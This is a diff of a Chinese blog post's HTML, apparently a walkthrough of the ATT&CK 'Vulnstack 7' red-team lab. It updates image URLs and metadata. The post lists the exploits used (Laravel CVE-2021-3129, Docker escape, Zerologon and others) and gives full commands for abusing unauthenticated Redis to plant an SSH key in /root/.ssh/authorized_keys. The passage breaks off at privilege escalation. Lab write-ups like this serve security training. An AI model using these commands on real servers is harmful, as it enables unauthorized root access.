+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1799eaddbfd442999d093acfe1c0f370.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//53c749913e7d453f815b44d716644883.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d51692c57b2748a89fb4e606eaf3c527.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d9a083f45d1a4bc09126541858e71fa7.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//581cb4f18e1c41cabaf63126b0b4ceeb.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c183371ac85c4ad184cd4df45e591748.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//707e71b107d54c01b85279d11ca9e418.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7f735e32a3db4317a973c88c0654a17a.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d946a70ebdf64a7d99f56cc9fce62faf.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//00bf65081ce34de6b22cf9198a56596e.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c70a5ff7bd7a48d4a8e875531be06a3c.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fdf80c4557c4a5f8eb0f044d3f01222.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cfb2fab357bf41c9a432400a5b2c7ade.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1cfe46c1d624451da701158de08f3803.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//078afd3ceba74f1baeea796defa7566a.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//28ba729bfaab4989a43472b17cc12b74.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1a98a01b8d47490bba6d728b92e5fec1.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//db03344db2ab447a8d120ff234c699e0.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9da33fe626304021a88df527d876a98c.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c2ac3ee03bab4880bfb5839f357852a2.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//de878490496c4eb796b61308cc7ec838.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//8fd3d153c2144cbc9ffd21d1df575126.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ed4c058436664b95b67985d3b55d44a5.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2b24a9b37581446d90bccf570c3a3169.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4d416464c2b043a89fe10e1bdd984af4.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//644d08c2a340453cafe922512d54a65d.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d8f86df95c2348abb10233890c29522a.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fb61764762c64ddbab71ab0878bc7686.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//82bc99be64074c389d8ad89c5840e9b8.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1d07be6335f848b7a948bc183d4f3c1b.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7ae47f7ea9494f50858d4053fe86705d.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d6bc3360d674df88aacb8a792b7210d.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//60a72cecad1a4d649c5b31d2f67d27c8.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1b49ba7a8e9740b8971cb0ad4d4f3f71.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7e836052337d412a859e3863fca8a3cf.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//239ff8697d3f41ac9bc5e6fc4e61d045.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d56f010a795d4a8683c7696002dafd2b.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d176266efa75473a966f4826fbea7a08.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cf98e4a1835f41a0ab3c5f2df20c7386.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2750c4ec2f724cdeb24ec6503cdfd6bd.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ea822a525dc147438753a1f2653ee50b.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//083e4e10ccde4dcb9c560f210f4dfb86.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//793acbb4dd84467d98afa369909944e8.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//328ef4bf59ac4f649004955c1fd88330.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c22bc9e15e411a9374d6ca00368474.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9392aab0eb624a3b823336b4ff1cbed9.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f0d6c518255c45f5a735d7c9efcacfc2.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e012d20b58114b04aa3bf5366a7d38fa.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d749b30b2b944fea074420f630ccd2f.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f482bb44341a414ea24a0e65607a40e4.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dd986b533f41492b95f58002ee730b8b.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a192967f4cb844c38d30efdfc0ba09e0.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc8069b746e042be99dd8051c96dd146.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9dd2a2c725b944f399071251d0b1c713.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b56f595b3d0843c4bb63d76f8e8d27d4.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//04f48daef0414c1ba373b9c1ac2b9286.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b7fd5c8867d447baa2f26f09c1ddcef4.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//026e2ebdeb0f470993bfe597570d84fc.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5e0f994fd9334d6aa9520fef3e9deeaa.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc5fb2abf6af4f00916453387f74d3bf.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e77e5652e9b744f18af11ec5ea0f86e7.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//bc3ae6daecb44b3b82f6695cb0d94be3.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dc11dcb9bf074a748f8d75f5a4cb74d9.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//456757690554447086f35d1d68ffdccc.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fe47b85a98244938ffb2118a26672be.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//6da88b4814044d39b8f8048caea0cae9.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5fc0111ed76f4b86927207d8b9266570.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9d82071875e9491a891573cbdea27aae.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0a63b81c38e94316ba87add67ad126aa.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2ada0f0b4d604f279ecacea0d1490916.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//42fc36db087548d3b2b90920cd5dbe9d.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e9fc04d47e5b48cbab8aad3f04330061.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4dfe2f47d95d4bbfa759dca4906fed1f.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d0710ced3002422888bef520910d9f3e.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//83767830d60e47a697f16aea593f6e95.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//48124d1729b54dbf966914ab0415a6a1.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0693a37257e64f9ea776866dd160f4c1.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//77a62349712941489cec268835f475fd.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//93ae7b9b9ffc4f14a69deace9a3b1637.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//738791180f0d45ea8d1b68772a3cdd3e.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c9fec437c7444e8ab4aa882ea29d12.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f1de3b7d8da04b6aa1463f61ce5e4bf3.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fbba812767464392934d090eec8ae188.png">
 <meta property="article:published_time" content="2021-08-09T15:13:23.854Z">
-<meta property="article:modified_time" content="2021-08-09T15:13:19.062Z">
+<meta property="article:modified_time" content="2023-03-16T14:32:18.154Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/868c417143234dd29ecb57aefdc38e9e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta name="twitter:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//868c417143234dd29ecb57aefdc38e9e.png">
 
 <link rel="canonical" href="http://example.com/2021/08/09/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/">
 
@@ -219,7 +219,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">107</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">105</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -299,10 +299,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-08-09 23:13:23 / 修改时间：23:13:19" itemprop="dateCreated datePublished" datetime="2021-08-09T23:13:23+08:00">2021-08-09</time>
+              <time title="创建时间：2021-08-09 23:13:23" itemprop="dateCreated datePublished" datetime="2021-08-09T23:13:23+08:00">2021-08-09</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-16 22:32:18" itemprop="dateModified" datetime="2023-03-16T22:32:18+08:00">2023-03-16</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -332,7 +338,7 @@
 
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久没打过靶机了，<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">ATT&amp;CK红队评估实战靶场（七）</a></p>
-<p><img src="https://img-blog.csdnimg.cn/868c417143234dd29ecb57aefdc38e9e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//868c417143234dd29ecb57aefdc38e9e.png"></p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞搜索与利用</p>
 <blockquote>
 <p>Laravel Debug mode RCE（CVE-2021-3129）漏洞利用<br>Docker逃逸<br>通达OA v11.3 漏洞利用<br>Linux环境变量提权<br>Redis 未授权访问漏洞<br>Linux sudo权限提升（CVE-2021-3156）漏洞利用<br>SSH密钥利用<br>Windows NetLogon 域内权限提升（CVE-2020-1472）漏洞利用<br>MS14-068漏洞利用</p>
@@ -341,7 +347,7 @@
 
 <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14</p>
 <p>VMnet8设为默认的NAT模式，IP段设为192.168.52.0/24；VMnet14设为仅主机模式，IP段设为192.168.93.0/24</p>
-<p><img src="https://img-blog.csdnimg.cn/2fa2a12803644d3ca15fe1049600a71c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2fa2a12803644d3ca15fe1049600a71c.png"></p>
 <p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网</p>
 <p>攻击机kali：192.168.42.224<br>web1：192.168.42.30</p>
 <h2 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h2><p>DMZ区的 Ubuntu 需要启动nginx服务：</p>
@@ -373,52 +379,52 @@
 <blockquote>
 <p>nmap -T4 -sV -A 192.168.42.30 -p 1-65535</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/a8e85f92ac724c6cadfea54a77afec1a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>开启了 22 80 81 6379端口</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a8e85f92ac724c6cadfea54a77afec1a.png"><br>开启了 22 80 81 6379端口</p>
 <p>22 ssh端口不说了，80端口是一个博客，没有什么利用点</p>
 <p>访问81端口发现是Laravel框架且版本是 <code>Laravel v8.29.0 (PHP v7.4.14)</code></p>
-<p><img src="https://img-blog.csdnimg.cn/a93ff3e0e06f4fd78602fe62c0ee8cf4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a93ff3e0e06f4fd78602fe62c0ee8cf4.png"></p>
 <p>搜索到漏洞CVE-2021-3129，Exp工具直接打一波</p>
 <p>工具：<a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">laravel-CVE-2021-3129-EXP</a></p>
-<p><img src="https://img-blog.csdnimg.cn/b0129f34de1f4828bfe0d651d771dc0b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>这个shell哥斯拉3.03没连接上可能要使用旧版哥斯拉才能连接，又找到一款写入一句话的工具：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b0129f34de1f4828bfe0d651d771dc0b.png"><br>这个shell哥斯拉3.03没连接上可能要使用旧版哥斯拉才能连接，又找到一款写入一句话的工具：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/1111one/laravel-CVE-2021-3129-EXP">laravel-CVE-2021-3129-EXP</a></p>
 <p>成功getshell</p>
 <p>发现是docker环境</p>
 <blockquote>
 <p>hostname<br>ls -alh /.dockerenv<br>cat /proc/1/cgroup</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/1799eaddbfd442999d093acfe1c0f370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1799eaddbfd442999d093acfe1c0f370.png"></p>
 <h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>先上两篇文章</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1853008">Redis 常见漏洞利用方法总结 - 云+社区 - 腾讯云 (tencent.com)</a></p>
 <p>还有一个 <code>6379端口</code> 没有测试，要充分发挥所收集到的信息加以利用</p>
 <p>Redis：</p>
-<p><img src="https://img-blog.csdnimg.cn/53c749913e7d453f815b44d716644883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>先安装个客户端</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//53c749913e7d453f815b44d716644883.png"><br>先安装个客户端</p>
 <blockquote>
 <p>#安装<br>wget <a target="_blank" rel="noopener" href="http://download.redis.io/redis-stable.tar.gz">http://download.redis.io/redis-stable.tar.gz</a><br>tar xvzf redis-stable.tar.gz<br>cd redis-stable<br>make<br>sudo cp src/redis-cli /usr/local/bin/</p>
 </blockquote>
 <p>先尝试连接redis：</p>
-<p><img src="https://img-blog.csdnimg.cn/d51692c57b2748a89fb4e606eaf3c527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>连接成功，尝试写ssh 公钥</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d51692c57b2748a89fb4e606eaf3c527.png"><br>连接成功，尝试写ssh 公钥</p>
 <blockquote>
 <p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过<code>修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys</code>，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/d9a083f45d1a4bc09126541858e71fa7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/581cb4f18e1c41cabaf63126b0b4ceeb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d9a083f45d1a4bc09126541858e71fa7.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//581cb4f18e1c41cabaf63126b0b4ceeb.png"><br>接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa  &#x2F;&#x2F;主机生成公钥</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; cys.txt  &#x2F;&#x2F;将公钥导入cys.txt文件,避免数据混合用 &#39;\n&#39;</span><br><span class="line"></span><br><span class="line">cat cys.txt | redis-cli -h 192.168.42.30 -p 6379 -x set cys   &#x2F;&#x2F;把cys.txt文件内容写入目标主机的redis缓冲中,key为cys</span><br><span class="line">&#x2F;&#x2F; -x 代表从标准输入读取数据作为该命令的最后一个参数</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/c183371ac85c4ad184cd4df45e591748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>然后，使用攻击机连接目标机器Redis，<code>设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys</code>，并将数据保存在目标服务器硬盘上</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c183371ac85c4ad184cd4df45e591748.png"><br>然后，使用攻击机连接目标机器Redis，<code>设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys</code>，并将数据保存在目标服务器硬盘上</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh      # 设置redis的备份路径为&#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys     # 设置保存文件名authorized_keys</span><br><span class="line">save        # 将数据保存在目标服务器硬盘上</span><br><span class="line">ssh 192.168.213.188    #连接</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/707e71b107d54c01b85279d11ca9e418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>攻击机ssh直接连接：</p>
-<p><img src="https://img-blog.csdnimg.cn/7f735e32a3db4317a973c88c0654a17a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//707e71b107d54c01b85279d11ca9e418.png"><br>攻击机ssh直接连接：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7f735e32a3db4317a973c88c0654a17a.png"></p>
 <p>先看一手IP信息发现两个网段</p>
-<p><img src="https://img-blog.csdnimg.cn/d946a70ebdf64a7d99f56cc9fce62faf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/00bf65081ce34de6b22cf9198a56596e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>发现nginx服务：</p>
-<p><img src="https://img-blog.csdnimg.cn/c70a5ff7bd7a48d4a8e875531be06a3c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>看一下配置文件：</p>
-<p><img src="https://img-blog.csdnimg.cn/7fdf80c4557c4a5f8eb0f044d3f01222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>81端口是反代另一个网段的机器的8000端口，结合webshell的docker环境，所以说，web1反代了web2的docker，那么接下来就是利用docker逃逸来控制第二台机器</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d946a70ebdf64a7d99f56cc9fce62faf.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//00bf65081ce34de6b22cf9198a56596e.png"><br>发现nginx服务：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c70a5ff7bd7a48d4a8e875531be06a3c.png"><br>看一下配置文件：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fdf80c4557c4a5f8eb0f044d3f01222.png"><br>81端口是反代另一个网段的机器的8000端口，结合webshell的docker环境，所以说，web1反代了web2的docker，那么接下来就是利用docker逃逸来控制第二台机器</p>
 <h2 id="反弹dockershell"><a href="#反弹dockershell" class="headerlink" title="反弹dockershell"></a>反弹dockershell</h2><blockquote>
 <p>按说，第二层网络是nat，应该是能访问到kali的，所以这里我能反弹dockers的shell，但是这个师傅说docker不出网，可能是前面的网络配置不同吧</p>
 </blockquote>
 <p>后来想了一下，真实环境中，web2应该处于内网中，肯定不能访问kali，所以将docker的shell反弹到web1上，将web1作为跳板机</p>
 <p>反弹shell的方式也有很多了，bash一句话，msf，python起一个httpserver等</p>
 <p>bash一句话：</p>
-<p><img src="https://img-blog.csdnimg.cn/cfb2fab357bf41c9a432400a5b2c7ade.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cfb2fab357bf41c9a432400a5b2c7ade.png"></p>
 <h2 id="docker提权–环境变量提权"><a href="#docker提权–环境变量提权" class="headerlink" title="docker提权–环境变量提权"></a>docker提权–环境变量提权</h2><p>现在的docker权限是一个www-data，先将权限提升一下</p>
 <p>能想到的是内核提权，但是这里学习到了一个新的方法，环境变量提权</p>
